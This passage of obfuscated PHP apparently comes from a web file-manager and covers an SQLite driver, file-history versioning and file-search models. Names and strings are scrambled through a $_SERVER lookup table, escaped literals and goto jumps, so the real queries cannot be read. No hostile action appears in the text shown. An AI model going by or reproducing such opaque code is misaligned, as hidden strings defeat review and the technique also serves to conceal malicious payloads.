$_SERVER[µÅ˜º…æ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ê¹ÃÀ»‡; if ($this->queryID) { $this->free(); } think_action_status($†°é„Œ‹[25], 1); think_status($†°é„Œ‹[24]); $…©èçáÚ = $this->_linkID->exec($ê¹ÃÀ»‡); $this->debug(); if (!1 === $…©èçáÚ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[µÅ˜º…æ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ë£«€ã = $this->_linkID->query($_SERVER[µÅ˜º…æ][27]); if (!$ë£«€ã) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ó¼£íç¡ = $this->_linkID->query($_SERVER[µÅ˜º…æ][28]); if (!$Ó¼£íç¡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ğş¹ßş’ = array(); while ($¾‰âø¼Ğ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Ğş¹ßş’[] = $¾‰âø¼Ğ; } $this->queryID->reset(); return $Ğş¹ßş’; } public function getFields($Ù…¶ÙóÎ) { $Ñ »¿Ó =& $_SERVER[µÅ˜º…æ]; $Ü¾ÉïŒ¸ = $this->query($Ñ »¿Ó[29] . $Ù…¶ÙóÎ . $Ñ »¿Ó[30]); $’“Ÿ¤Í = array(); if ($Ü¾ÉïŒ¸) { foreach ($Ü¾ÉïŒ¸ as $›øü¨µú => $Âö°ßø) { $’“Ÿ¤Í[$Âö°ßø[$Ñ »¿Ó[32]]] = array($Ñ »¿Ó[32] => $Âö°ßø[$Ñ »¿Ó[32]], $Ñ »¿Ó[33] => $Âö°ßø[$Ñ »¿Ó[33]], $Ñ »¿Ó[35] => (bool) ($Âö°ßø[$Ñ »¿Ó[35]] === $Ñ »¿Ó[12]), $Ñ »¿Ó[37] => $Âö°ßø[$Ñ »¿Ó[56]], $Ñ »¿Ó[39] => (bool) $Âö°ßø[$Ñ »¿Ó[57]], $Ñ »¿Ó[42] => (bool) $Âö°ßø[$Ñ »¿Ó[57]]); } } return $’“Ÿ¤Í; } public function getTables($ÓØ†ŸÕª = '') { $…Â¯Œ¥ =& $_SERVER[µÅ˜º…æ]; $ìƒÆÁë = $this->query($…Â¯Œ¥[45] . $…Â¯Œ¥[46] . $…Â¯Œ¥[47]); $øÙÓé¢î = array(); foreach ($ìƒÆÁë as $ëÚû¿éÂ => $ú’˜¹) { $øÙÓé¢î[$ëÚû¿éÂ] = current($ú’˜¹); } return $øÙÓé¢î; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $‚õ•õá =& $_SERVER[µÅ˜º…æ]; $this->error = $this->_linkID->lastErrorMsg(); if ($‚õ•õá[12] != $this->queryStr) { $this->error .= LNG($‚õ•õá[48]) . $this->queryStr; } think_trace($this->error, $‚õ•õá[12], $‚õ•õá[49]); return $this->error; } public function escapeString($³ÓÌÊñ) { $İ„¨ÌÌ’ =& $_SERVER[µÅ˜º…æ]; if ($this->_linkID) { return $this->_linkID->escapeString($³ÓÌÊñ); } return str_ireplace($İ„¨ÌÌ’[58], $İ„¨ÌÌ’[59], $³ÓÌÊñ); } public function parseLimit($¥ê€Š×á) { $Ñ€”°¶Ì =& $_SERVER[µÅ˜º…æ]; $Òçñğû = $Ñ€”°¶Ì[12]; if (!empty($¥ê€Š×á)) { $¥ê€Š×á = explode($Ñ€”°¶Ì[50], $¥ê€Š×á); if (count($¥ê€Š×á) > 1) { $Òçñğû .= $Ñ€”°¶Ì[51] . $¥ê€Š×á[1] . $Ñ€”°¶Ì[52] . $¥ê€Š×á[0] . $Ñ€”°¶Ì[53]; } else { $Òçñğû .= $Ñ€”°¶Ì[51] . $¥ê€Š×á[0] . $Ñ€”°¶Ì[53]; } } return $Òçñğû; } } goto eŒ²Ë¿¢‹; Aœˆ“•Ã´: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\162\143\145\137\x68\x69\x73\164\157\x72\171"; public function historyCount($üıçı¼›) { $¶„Ñ¥ØÂ =& $_SERVER[µÅ˜º…æ]; if (!$üıçı¼›) { return array(); } if (is_string($üıçı¼›) || is_int($üıçı¼›)) { $üıçı¼› = array($üıçı¼›); } $šİ±â = array($¶„Ñ¥ØÂ[191], $¶„Ñ¥ØÂ[948] => $¶„Ñ¥ØÂ[585]); $Ìƒ•¶¿Ú = array($¶„Ñ¥ØÂ[191] => array($¶„Ñ¥ØÂ[7], $üıçı¼›)); $ÚîÍ½ÆÕ = $this->field($šİ±â)->where($Ìƒ•¶¿Ú)->group($¶„Ñ¥ØÂ[191])->select(); return array_to_keyvalue($ÚîÍ½ÆÕ, $¶„Ñ¥ØÂ[191], $¶„Ñ¥ØÂ[585]); } public function addHistory($Ù‘Ğ€üñ, $íŞ–®€ = '') { $¿¾‘ · =& $_SERVER[µÅ˜º…æ]; $£Èµ©ı = array($¿¾‘ ·[506] => $Ù‘Ğ€üñ[$¿¾‘ ·[191]], $¿¾‘ ·[1967] => isset($Ù‘Ğ€üñ[$¿¾‘ ·[543]]) ? $Ù‘Ğ€üñ[$¿¾‘ ·[543]] : $Ù‘Ğ€üñ[$¿¾‘ ·[541]], $¿¾‘ ·[558] => $Ù‘Ğ€üñ[$¿¾‘ ·[557]], $¿¾‘ ·[640] => $Ù‘Ğ€üñ[$¿¾‘ ·[79]], $¿¾‘ ·[2434] => $íŞ–®€); if ($GLOBALS[$¿¾‘ ·[6]][$¿¾‘ ·[92]][$¿¾‘ ·[1408]] >= 1) { $this->historyAutoClear($£Èµ©ı[$¿¾‘ ·[191]]); $this->add($£Èµ©ı); } Hook::trigger($¿¾‘ ·[2435], $£Èµ©ı); Model($¿¾‘ ·[2436])->eventFileEdit($Ù‘Ğ€üñ[$¿¾‘ ·[191]]); } private function historyAutoClear($ş“×„‚¨) { $ß×Ö…Ø =& $_SERVER[µÅ˜º…æ]; $ù‹¨”›© = Model($ß×Ö…Ø[872])->get($ß×Ö…Ø[960]); $÷”›û™ = intval($GLOBALS[$ß×Ö…Ø[6]][$ß×Ö…Ø[92]][$ß×Ö…Ø[1408]]); $…•È¿ò = $ù‹¨”›© == $ß×Ö…Ø[961] ? min(5, $÷”›û™) : $÷”›û™; $…•È¿ò = $…•È¿ò <= 0 ? 0 : $…•È¿ò - 1; if ($…•È¿ò >= 499) { return; } $©¨§Ğ‰Ó = array($ß×Ö…Ø[506] => $ş“×„‚¨); $ûîßùï› = $this->field($ß×Ö…Ø[2437])->where($©¨§Ğ‰Ó)->order($ß×Ö…Ø[2431])->select(); if (!$ûîßùï› || $…•È¿ò >= count($ûîßùï›)) { return; } $‰İçÖ = array_to_keyvalue($ûîßùï›, $ß×Ö…Ø[12], $ß×Ö…Ø[487]); $‰İçÖ = array_slice($‰İçÖ, $…•È¿ò); $šœ¤áçñ = array_to_keyvalue($ûîßùï›, $ß×Ö…Ø[12], $ß×Ö…Ø[557]); $šœ¤áçñ = array_slice($šœ¤áçñ, $…•È¿ò); if (!$‰İçÖ || !$šœ¤áçñ) { return; } $©¨§Ğ‰Ó = array($ß×Ö…Ø[508] => array($ß×Ö…Ø[7], $‰İçÖ)); $this->where($©¨§Ğ‰Ó)->delete(); Model($ß×Ö…Ø[560])->remove($šœ¤áçñ); } public function listData($– ‹öèû) { $ÇªÛ€ìÚ =& $_SERVER[µÅ˜º…æ]; $ªªöœ«ß = array($ÇªÛ€ìÚ[506] => $– ‹öèû); $¾àŞÁÂ = $ÇªÛ€ìÚ[2438]; $”¿ÙªŒ‚ = $this->field($¾àŞÁÂ)->where($ªªöœ«ß)->order($ÇªÛ€ìÚ[2431])->selectPage(); $this->_listAppendUser($”¿ÙªŒ‚[$ÇªÛ€ìÚ[446]]); $€À­­‘ê = Model($ÇªÛ€ìÚ[872])->get($ÇªÛ€ìÚ[960]); $³ŠÌ¦Ä€ = 5; if ($€À­­‘ê == $ÇªÛ€ìÚ[961]) { $”¿ÙªŒ‚[$ÇªÛ€ìÚ[446]] = array_slice($”¿ÙªŒ‚[$ÇªÛ€ìÚ[446]], 0, $³ŠÌ¦Ä€); $”¿ÙªŒ‚[$ÇªÛ€ìÚ[443]] = array($ÇªÛ€ìÚ[2439] => 1, $ÇªÛ€ìÚ[2440] => 20, $ÇªÛ€ìÚ[2441] => 1, $ÇªÛ€ìÚ[2330] => count($”¿ÙªŒ‚[$ÇªÛ€ìÚ[446]])); } return $”¿ÙªŒ‚; } protected function _listAppendUser(&$¡‡·æÎÃ) { $µÙ®Ö‡ı =& $_SERVER[µÅ˜º…æ]; $ùÑ–ôîĞ = array_to_keyvalue($¡‡·æÎÃ, $µÙ®Ö‡ı[12], $µÙ®Ö‡ı[1593]); $±éıÛ„× = Model($µÙ®Ö‡ı[617])->userListInfo($ùÑ–ôîĞ); foreach ($¡‡·æÎÃ as &$òÔêş­) { $©ÊÈì¤¾ = $òÔêş­[$µÙ®Ö‡ı[1593]]; $òÔêş­[$µÙ®Ö‡ı[541]] = $±éıÛ„×[$©ÊÈì¤¾] ? $±éıÛ„×[$©ÊÈì¤¾] : !1; } unset($òÔêş­); } public function fileInfo($›Üºåˆ, $É†éÑÇ¢ = false) { $‘¦àå·Ğ =& $_SERVER[µÅ˜º…æ]; $ü‰Œƒöš = $this->tablePrefix; $ØÎÓ¢èâ = "{$ü‰Œƒöš}\151\x6f\137\146\x69\x6c\145\40\146\x69\x6c\x65\163\x20\157\x6e\x20\146\151\x6c\145\163\x2e\146\151\154\145\x49\x44\40\75\x20\x68\151\163\x74\157\x72\171\x2e\146\151\154\x65\x49\x44"; $ğü¹×ªé = $this->alias($‘¦àå·Ğ[2442])->where(array($‘¦àå·Ğ[508] => $›Üºåˆ))->join($ØÎÓ¢èâ, $‘¦àå·Ğ[2443])->find(); if ($ğü¹×ªé && $É†éÑÇ¢) { $Ü±ãĞ•­ = array($‘¦àå·Ğ[191] => $ğü¹×ªé[$‘¦àå·Ğ[191]], $‘¦àå·Ğ[487] => array($‘¦àå·Ğ[1182], $›Üºåˆ)); $ğü¹×ªé[$‘¦àå·Ğ[1864]] = $this->where($Ü±ãĞ•­)->count(); } return $ğü¹×ªé; } public function removeItem($–ˆƒ²Ë¾) { $™‹œôàš =& $_SERVER[µÅ˜º…æ]; $¢Á¬¾å€ = array($™‹œôàš[508] => $–ˆƒ²Ë¾); $üú˜Ä½‰ = $this->where($¢Á¬¾å€)->find(); if ($üú˜Ä½‰) { $í¬ş¿›‚ = $this->where($¢Á¬¾å€)->delete(); Model($™‹œôàš[560])->remove($üú˜Ä½‰[$™‹œôàš[557]]); return $í¬ş¿›‚; } return !1; } public function removeBySource($«ÈÛ×óã) { $×Ïì˜•Ğ =& $_SERVER[µÅ˜º…æ]; if (!$«ÈÛ×óã) { return !1; } if (!is_array($«ÈÛ×óã)) { $«ÈÛ×óã = array($«ÈÛ×óã); } $çÀæû = array($×Ïì˜•Ğ[506] => array($×Ïì˜•Ğ[7], $«ÈÛ×óã)); $Éßîˆ ™ = $this->field($×Ïì˜•Ğ[558])->where($çÀæû)->select(); if ($Éßîˆ ™) { $this->where($çÀæû)->delete(); $Œ–öûŒ = array_to_keyvalue($Éßîˆ ™, $×Ïì˜•Ğ[12], $×Ïì˜•Ğ[557]); Model($×Ïì˜•Ğ[560])->remove($Œ–öûŒ); } return !0; } public function setDetail($¢®ğ×ÈÙ, $Å•”÷Õ«) { $®…ñóä =& $_SERVER[µÅ˜º…æ]; return $this->where(array($®…ñóä[508] => $¢®ğ×ÈÙ))->save(array($®…ñóä[2434] => $Å•”÷Õ«)); } public function rollbackToItem($éŸÄ”êÍ, $›Ëöö÷) { $Ğ¦˜Û¸Î =& $_SERVER[µÅ˜º…æ]; $”÷ÑĞ‹¯ = Model($Ğ¦˜Û¸Î[932])->sourceInfo($éŸÄ”êÍ); $this->addHistory($”÷ÑĞ‹¯, LNG($Ğ¦˜Û¸Î[2444])); $°„´Éê­ = $this->find($›Ëöö÷); $À“öÙÀ = array($Ğ¦˜Û¸Î[557] => $°„´Éê­[$Ğ¦˜Û¸Î[557]], $Ğ¦˜Û¸Î[79] => $°„´Éê­[$Ğ¦˜Û¸Î[79]], $Ğ¦˜Û¸Î[88] => time(), $Ğ¦˜Û¸Î[543] => USER_ID); Model($Ğ¦˜Û¸Î[932])->where(array($Ğ¦˜Û¸Î[191] => $éŸÄ”êÍ))->save($À“öÙÀ); return $this->where(array($Ğ¦˜Û¸Î[508] => $›Ëöö÷))->delete(); } public function clearSame($ü¹«ÅØ) { $€ÕÙïå¤ =& $_SERVER[µÅ˜º…æ]; $–‘Ûò¤› = $this->listData($ü¹«ÅØ); $ÍÎĞ¨ê = array_to_keyvalue_group($–‘Ûò¤›, $€ÕÙïå¤[557]); $­®èè†Ü = array(); $ÙÁø£‘Ò = array(); foreach ($ÍÎĞ¨ê as $‹¢¾–‘š) { if (!$‹¢¾–‘š || count($‹¢¾–‘š) <= 1) { continue; } foreach ($‹¢¾–‘š as $¦æƒãï«) { $­®èè†Ü[] = $¦æƒãï«[$€ÕÙïå¤[557]]; $ÙÁø£‘Ò[] = $¦æƒãï«[$€ÕÙïå¤[487]]; } } if (!$ÙÁø£‘Ò) { return; } $this->where(array($€ÕÙïå¤[487] => array($€ÕÙïå¤[7], $ÙÁø£‘Ò)))->delete(); Model($€ÕÙïå¤[560])->remove($­®èè†Ü); } public function userSpace() { $®¾‡–ìç =& $_SERVER[µÅ˜º…æ]; $Ä¢å¿°  = $this->tablePrefix; $Åã¿í’­ = array($®¾‡–ìç[1967] => USER_ID); $Â­ĞÑŸõ = "{$Ä¢å¿° }\151\x6f\x5f\146\x69\x6c\x65\40\x66\151\x6c\145\163\x20\x6f\156\x20\146\x69\154\x65\163\x2e\x66\x69\154\145\111\x44\40\75\x20\x68\151\163\164\x6f\x72\x79\x2e\146\x69\x6c\145\111\x44"; return $this->alias($®¾‡–ìç[2442])->where($Åã¿í’­)->join($Â­ĞÑŸõ, $®¾‡–ìç[2443])->sum($®¾‡–ìç[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ı“ö½ë) { $£œ²ºöÑ =& $_SERVER[µÅ˜º…æ]; $¯€•Ú¤ê = KodIO::fileTypeList(); $¼„¬¯¼ğ = $¯€•Ú¤ê[$ı“ö½ë]; if (!$¼„¬¯¼ğ) { return array(); } $ºÒ—ŞÏˆ = $¼„¬¯¼ğ[$£œ²ºöÑ[166]]; $É­Ôìı = $£œ²ºöÑ[7]; if (!$¼„¬¯¼ğ[$£œ²ºöÑ[166]]) { $½“úˆØ• = array_to_keyvalue($¯€•Ú¤ê, $£œ²ºöÑ[12], $£œ²ºöÑ[166]); $ºÒ—ŞÏˆ = implode($£œ²ºöÑ[50], $½“úˆØ•); $É­Ôìı = $£œ²ºöÑ[2445]; } $­£şİö = explode($£œ²ºöÑ[50], trim($ºÒ—ŞÏˆ, $£œ²ºöÑ[50])); return array($É­Ôìı, $­£şİö); } public function listPathType($ï‹ÚÙÃŸ) { $Èò £Ï =& $_SERVER[µÅ˜º…æ]; $Ö‹üú’¤ = $this->fileTypeWhere($ï‹ÚÙÃŸ); if (!$Ö‹üú’¤) { return array(); } $¯Ú¡–«ş = USER_ID; $‰ÆˆõÎ = Model($Èò £Ï[617])->getInfo($¯Ú¡–«ş); $‰¸Ğíˆ = array($Èò £Ï[670] => SourceModel::TYPE_USER, $Èò £Ï[604] => array($Èò £Ï[635], $Èò £Ï[613] . $‰ÆˆõÎ[$Èò £Ï[90]][$Èò £Ï[191]] . $Èò £Ï[636]), $Èò £Ï[671] => $¯Ú¡–«ş, $Èò £Ï[668] => 0, $Èò £Ï[669] => $Ö‹üú’¤); return $this->listSource($‰¸Ğíˆ); } public function listSearch($¬â„àÂ, $Àñ’¦÷Ÿ = 300) { $º±²Ñ’ =& $_SERVER[µÅ˜º…æ]; if (isset($¬â„àÂ[$º±²Ñ’[2279]]) && $¬â„àÂ[$º±²Ñ’[2279]]) { $¬â„àÂ[$º±²Ñ’[2279]] = str_replace($º±²Ñ’[474], $º±²Ñ’[2446], trim($¬â„àÂ[$º±²Ñ’[2279]])); } $Ò–äñæ = $this->_parseSearchWhere($¬â„àÂ); if (!isset($Ò–äñæ[$º±²Ñ’[520]])) { $Ò–äñæ[$º±²Ñ’[520]] = 0; } $Œ÷‚œ¯à = $º±²Ñ’[2447]; $€·Ê¸à› = $Ò–äñæ; $úÄ¼š†Â = $Œ÷‚œ¯à; $this->_listSearchBindPinyin($¬â„àÂ, $Ò–äñæ, $Œ÷‚œ¯à); $this->alias($º±²Ñ’[533])->_makeOrder(); $Ò–äñæ = $this->parseWhereLike($Ò–äñæ); $äâ¥Õªú = $this->distinct(!0)->field($Œ÷‚œ¯à)->where($Ò–äñæ)->selectPage($Àñ’¦÷Ÿ); if ($GLOBALS[$º±²Ñ’[6]][$º±²Ñ’[468]][$º±²Ñ’[469]] && Input::check($¬â„àÂ[$º±²Ñ’[2279]], $º±²Ñ’[677]) && $äâ¥Õªú[$º±²Ñ’[443]][$º±²Ñ’[428]] == 1 && $äâ¥Õªú[$º±²Ñ’[443]][$º±²Ñ’[444]] == 0) { $äâ¥Õªú = $this->distinct(!0)->field($Œ÷‚œ¯à)->where($€·Ê¸à›)->limit(1000)->select(); $äâ¥Õªú = array_page_split($äâ¥Õªú, !1, $Àñ’¦÷Ÿ); } $this->_listSearchFileContent($äâ¥Õªú, $¬â„àÂ, $úÄ¼š†Â, $€·Ê¸à›); $this->_listSearchDesc($äâ¥Õªú, $¬â„àÂ, $úÄ¼š†Â); $this->_listSearchTag($äâ¥Õªú, $¬â„àÂ, $úÄ¼š†Â); $this->_listSearchGroupTag($äâ¥Õªú, $¬â„àÂ, $úÄ¼š†Â); $this->_listDataApply($äâ¥Õªú[$º±²Ñ’[446]]); $this->_listMake($äâ¥Õªú); return $äâ¥Õªú; } private function _listSearchFileContent(&$±ÆÌĞ¬Ş, $ú›‹Œäı, $¶×›úÛ, $Áº¯¾Š³) { $†Â©¿»¾ =& $_SERVER[µÅ˜º…æ]; if (!$ú›‹Œäı[$†Â©¿»¾[2279]] || $±ÆÌĞ¬Ş[$†Â©¿»¾[443]][$†Â©¿»¾[428]] > 1) { return; } if (!isset($Áº¯¾Š³[$†Â©¿»¾[32]]) || !is_array($ú›‹Œäı[$†Â©¿»¾[557]]) || !$ú›‹Œäı[$†Â©¿»¾[557]]) { return; } $Áº¯¾Š³[$†Â©¿»¾[557]] = array($†Â©¿»¾[7], $ú›‹Œäı[$†Â©¿»¾[557]]); unset($Áº¯¾Š³[$†Â©¿»¾[32]]); unset($ú›‹Œäı[$†Â©¿»¾[557]]); $§¦íˆÃ“ = $this->field($¶×›úÛ)->where($Áº¯¾Š³)->limit($†Â©¿»¾[2448])->select(); $§¦íˆÃ“ = array_to_keyvalue($§¦íˆÃ“, $†Â©¿»¾[191], $†Â©¿»¾[12]); $²éúªÇÖ = array_to_keyvalue($±ÆÌĞ¬Ş[$†Â©¿»¾[446]], $†Â©¿»¾[191], $†Â©¿»¾[12]); $âØ“¼» = array(); foreach ($§¦íˆÃ“ as $íÇéó„÷ => $’…ÙàŒ²) { if (!$²éúªÇÖ[$íÇéó„÷]) { $âØ“¼»[] = $’…ÙàŒ²; } } if (!$âØ“¼») { return; } $±ÆÌĞ¬Ş[$†Â©¿»¾[446]] = array_merge($âØ“¼», $±ÆÌĞ¬Ş[$†Â©¿»¾[446]]); $±ÆÌĞ¬Ş[$†Â©¿»¾[443]][$†Â©¿»¾[444]] += count($âØ“¼»); } private function _listSearchTag(&$ú€ŠÛúå, $²í˜åªÅ, $Àı²áˆş) { $È°ú÷îí =& $_SERVER[µÅ˜º…æ]; if (empty($²í˜åªÅ[$È°ú÷îí[2142]]) || !in_array($È°ú÷îí[2449], $²í˜åªÅ[$È°ú÷îí[2142]])) { return; } if (!$²í˜åªÅ[$È°ú÷îí[2279]] || $ú€ŠÛúå[$È°ú÷îí[443]][$È°ú÷îí[428]] > 1) { return; } $Ñœ›–†ê = Model($È°ú÷îí[2450])->listData(); $Œ«Éèßü = array(); $ØËšó°Î = $²í˜åªÅ[$È°ú÷îí[2279]]; foreach ($Ñœ›–†ê as $Ö¹ŒÀµÎ) { $”úµ³®˜ = $Ö¹ŒÀµÎ[$È°ú÷îí[32]]; $Ê›şÓŠß = str_replace($È°ú÷îí[53], $È°ú÷îí[12], Pinyin::get($”úµ³®˜)); if (stripos($”úµ³®˜, $ØËšó°Î) !== !1 || stripos($Ê›şÓŠß, $ØËšó°Î) !== !1) { $Œ«Éèßü[] = $Ö¹ŒÀµÎ[$È°ú÷îí[487]]; } } if (!$Œ«Éèßü) { return; } $äíŞ‚Í» = array($È°ú÷îí[515] => array($È°ú÷îí[7], $Œ«Éèßü), $È°ú÷îí[1593] => USER_ID); $ˆûÈöåµ = Model($È°ú÷îí[517])->field($È°ú÷îí[87])->where($äíŞ‚Í»)->select(); $ˆûÈöåµ = array_to_keyvalue($ˆûÈöåµ, $È°ú÷îí[12], $È°ú÷îí[87]); $¸åôôå = array_unique($ˆûÈöåµ); $this->_listSearchMerge($ú€ŠÛúå, $²í˜åªÅ, $Àı²áˆş, $¸åôôå); } private function _listSearchDesc(&$¤Õ¬‡ò, $ì¦Ë´øî, $Êë·¡³†) { $Û©‡¶‘Ú =& $_SERVER[µÅ˜º…æ]; if (empty($ì¦Ë´øî[$Û©‡¶‘Ú[2142]]) || !in_array($Û©‡¶‘Ú[540], $ì¦Ë´øî[$Û©‡¶‘Ú[2142]])) { return; } if (!$ì¦Ë´øî[$Û©‡¶‘Ú[2279]] || $¤Õ¬‡ò[$Û©‡¶‘Ú[443]][$Û©‡¶‘Ú[428]] > 1) { return; } $Õô¯şêâ = array($Û©‡¶‘Ú[95] => $Û©‡¶‘Ú[540], $Û©‡¶‘Ú[451] => array($Û©‡¶‘Ú[473], $Û©‡¶‘Ú[2281] . $ì¦Ë´øî[$Û©‡¶‘Ú[2279]] . $Û©‡¶‘Ú[2281])); $×•Ó­‰É = !1; if ($×•Ó­‰É) { $ä®×Ùà = $this->listSearchChildren($ì¦Ë´øî[$Û©‡¶‘Ú[190]]); $ä®×Ùà = array_unique($ä®×Ùà); if (!$ä®×Ùà) { return; } $Õô¯şêâ[$Û©‡¶‘Ú[191]] = array($Û©‡¶‘Ú[7], $ä®×Ùà); } $Äı…Ùé“ = Model($Û©‡¶‘Ú[471])->field($Û©‡¶‘Ú[191])->where($Õô¯şêâ)->limit(5000)->select(); $Ü¤Í·Ï = array_to_keyvalue($Äı…Ùé“, $Û©‡¶‘Ú[12], $Û©‡¶‘Ú[191]); $this->_listSearchMerge($¤Õ¬‡ò, $ì¦Ë´øî, $Êë·¡³†, $Ü¤Í·Ï); } private function _listSearchGroupTag(&$ÕÑ¬šû², $¸À„Ï­ö, $–çç½Üô) { $èÈ²‘§× =& $_SERVER[µÅ˜º…æ]; if (empty($¸À„Ï­ö[$èÈ²‘§×[2142]]) || !in_array($èÈ²‘§×[2449], $¸À„Ï­ö[$èÈ²‘§×[2142]])) { return; } if (!$¸À„Ï­ö[$èÈ²‘§×[2279]] || $ÕÑ¬šû²[$èÈ²‘§×[443]][$èÈ²‘§×[428]] > 1 || !$¸À„Ï­ö[$èÈ²‘§×[190]]) { return; } $­ó‘¡ªÅ = $this->sourceInfo($¸À„Ï­ö[$èÈ²‘§×[190]]); if (!$­ó‘¡ªÅ || $­ó‘¡ªÅ[$èÈ²‘§×[188]] != SourceModel::TYPE_GROUP) { return; } $”ûÉµ²ç = $­ó‘¡ªÅ[$èÈ²‘§×[589]]; $¿òúÏÀÉ = Model($èÈ²‘§×[2451])->get($”ûÉµ²ç); $Òİ–İ = array(); $æÕ§ ”ù = $¸À„Ï­ö[$èÈ²‘§×[2279]]; foreach ($¿òúÏÀÉ[$èÈ²‘§×[446]] as $‡íûÔÄµ) { $ÊÙ ‹£á = $‡íûÔÄµ[$èÈ²‘§×[32]]; $Şã·öÏ = str_replace($èÈ²‘§×[53], $èÈ²‘§×[12], Pinyin::get($ÊÙ ‹£á)); if (stripos($ÊÙ ‹£á, $æÕ§ ”ù) !== !1 || stripos($Şã·öÏ, $æÕ§ ”ù) !== !1) { $Òİ–İ[] = $‡íûÔÄµ[$èÈ²‘§×[487]]; } } if (!$Òİ–İ) { return; } $Â¶¡úå„ = array($èÈ²‘§×[515] => array($èÈ²‘§×[7], $Òİ–İ), $èÈ²‘§×[1593] => 0, $èÈ²‘§×[33] => $èÈ²‘§×[1492] . $”ûÉµ²ç); $òèŠËÈ‰ = Model($èÈ²‘§×[517])->field($èÈ²‘§×[87])->where($Â¶¡úå„)->select(); $òèŠËÈ‰ = array_to_keyvalue($òèŠËÈ‰, $èÈ²‘§×[12], $èÈ²‘§×[87]); $—‹§÷–Ë = array_unique($òèŠËÈ‰); $this->_listSearchMerge($ÕÑ¬šû², $¸À„Ï­ö, $–çç½Üô, $—‹§÷–Ë); } private function _listSearchMerge(&$„«”“Ö , $ÈŞèàŞÈ, $†Åêú™€, $Ğì¡úèú) { $‹®ø‘ãŠ =& $_SERVER[µÅ˜º…æ]; if (!$Ğì¡úèú) { return; } $êŞËÊ²» = array_to_keyvalue($„«”“Ö [$‹®ø‘ãŠ[446]], $‹®ø‘ãŠ[12], $‹®ø‘ãŠ[191]); $úœñÕñğ = array_diff($Ğì¡úèú, $êŞËÊ²»); if (!$úœñÕñğ) { return; } $šÎú»ï£ = array($‹®ø‘ãŠ[191] => array($‹®ø‘ãŠ[7], $úœñÕñğ)); $œœ¶§Ç× = $this->field($†Åêú™€)->where($šÎú»ï£)->select(); if (!$œœ¶§Ç×) { return; } $ü’ı‰ú¼ = array(); foreach ($œœ¶§Ç× as $â‰†ôşÉ) { if ($this->_listSearchFilter($â‰†ôşÉ, $ÈŞèàŞÈ)) { $ü’ı‰ú¼[] = $â‰†ôşÉ; } } $„«”“Ö [$‹®ø‘ãŠ[446]] = array_merge($ü’ı‰ú¼, $„«”“Ö [$‹®ø‘ãŠ[446]]); $„«”“Ö [$‹®ø‘ãŠ[443]][$‹®ø‘ãŠ[444]] += count($ü’ı‰ú¼); } private function _listSearchFilter($¸¹¡†Î¥, $ŸŒØ³òì) { $™²Ë¨½¤ =& $_SERVER[µÅ˜º…æ]; $­»ùóÈÃ = $¸¹¡†Î¥[$™²Ë¨½¤[500]] == $™²Ë¨½¤[91]; if (!strstr($¸¹¡†Î¥[$™²Ë¨½¤[604]], $™²Ë¨½¤[50] . $ŸŒØ³òì[$™²Ë¨½¤[190]] . $™²Ë¨½¤[50])) { return !1; } if (isset($ŸŒØ³òì[$™²Ë¨½¤[501]]) && $ŸŒØ³òì[$™²Ë¨½¤[501]] != $™²Ë¨½¤[943]) { if ($ŸŒØ³òì[$™²Ë¨½¤[501]] == $™²Ë¨½¤[78] && !$­»ùóÈÃ) { return !1; } if ($ŸŒØ³òì[$™²Ë¨½¤[501]] != $™²Ë¨½¤[78] && $­»ùóÈÃ) { return !1; } if (!strstr($¸¹¡†Î¥[$™²Ë¨½¤[166]], $™²Ë¨½¤[50] . $ŸŒØ³òì[$™²Ë¨½¤[501]] . $™²Ë¨½¤[50])) { return !1; } } if (isset($ŸŒØ³òì[$™²Ë¨½¤[2452]]) && $ŸŒØ³òì[$™²Ë¨½¤[2452]] < $¸¹¡†Î¥[$™²Ë¨½¤[79]]) { return !1; } if (isset($ŸŒØ³òì[$™²Ë¨½¤[2453]]) && $ŸŒØ³òì[$™²Ë¨½¤[2453]] > $¸¹¡†Î¥[$™²Ë¨½¤[79]]) { return !1; } if (isset($ŸŒØ³òì[$™²Ë¨½¤[684]]) && $ŸŒØ³òì[$™²Ë¨½¤[684]] != $¸¹¡†Î¥[$™²Ë¨½¤[543]]) { return !1; } return !0; } public function listSearchChildren($Ë«Á²ÜŸ, $Şõôí· = 5000) { $ıØÓƒş• =& $_SERVER[µÅ˜º…æ]; $ˆ˜ÇœñÌ = array(); $¿Õœò‘ = $this->sourceInfo($Ë«Á²ÜŸ); $İĞ±µÇÏ = array($ıØÓƒş•[604] => array($ıØÓƒş•[473], $¿Õœò‘[$ıØÓƒş•[604]] . $¿Õœò‘[$ıØÓƒş•[191]] . $ıØÓƒş•[636])); $ı¶À¬Ìİ = $this->field($ıØÓƒş•[79])->where($İĞ±µÇÏ)->limit($Şõôí· + 1)->select(); $‡õÎØ£ä = is_array($ı¶À¬Ìİ) ? count($ı¶À¬Ìİ) : 0; if ($‡õÎØ£ä > $Şõôí·) { return $this->listChildrenDeep($Ë«Á²ÜŸ, $Şõôí·, 3); } $«¸®€„Ô = $this->field($ıØÓƒş•[191])->where($İĞ±µÇÏ)->select(); $ˆ˜ÇœñÌ = array_to_keyvalue($«¸®€„Ô, $ıØÓƒş•[12], $ıØÓƒş•[191]); return $ˆ˜ÇœñÌ; } public function listChildrenDeep($µïÃëü©, $•ğ’†ÂÇ, $¡£µ¸âê = 3) { $ŒòĞ³İ =& $_SERVER[µÅ˜º…æ]; $ÃéñûÇ¢ = array(); $ˆÉÅÀñ = array($µïÃëü©); for ($¥Ã’ˆáÙ = 0; $¥Ã’ˆáÙ < $¡£µ¸âê; $¥Ã’ˆáÙ++) { $ûšşó£Ù = array($ŒòĞ³İ[190] => array($ŒòĞ³İ[7], $ˆÉÅÀñ)); $í½ğß¿Ÿ = $this->field($ŒòĞ³İ[2454])->where($ûšşó£Ù)->select(); $ˆÉÅÀñ = 